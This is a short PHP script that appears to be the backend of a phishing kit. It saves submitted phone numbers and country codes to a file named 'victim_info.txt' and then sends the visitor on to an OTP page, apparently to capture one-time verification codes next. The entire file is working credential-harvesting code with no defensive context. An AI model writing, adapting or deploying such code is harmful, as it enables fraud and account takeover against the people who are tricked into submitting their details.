<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the phone number and country code from the form
    $phone_number = $_POST['phone-number'];
    $country_code = $_POST['country-code'];
    
    // Prepare the data to be saved
    $full_number = $country_code . " " . $phone_number;

    // Save the phone number to victim_info.txt
    $file = fopen("victim_info.txt", "a");
    fwrite($file, "Phone Number: " . $full_number . "\n");
    fclose($file);

    // Redirect to OTP page
    header("Location: otp.html");
    exit();
}
?>
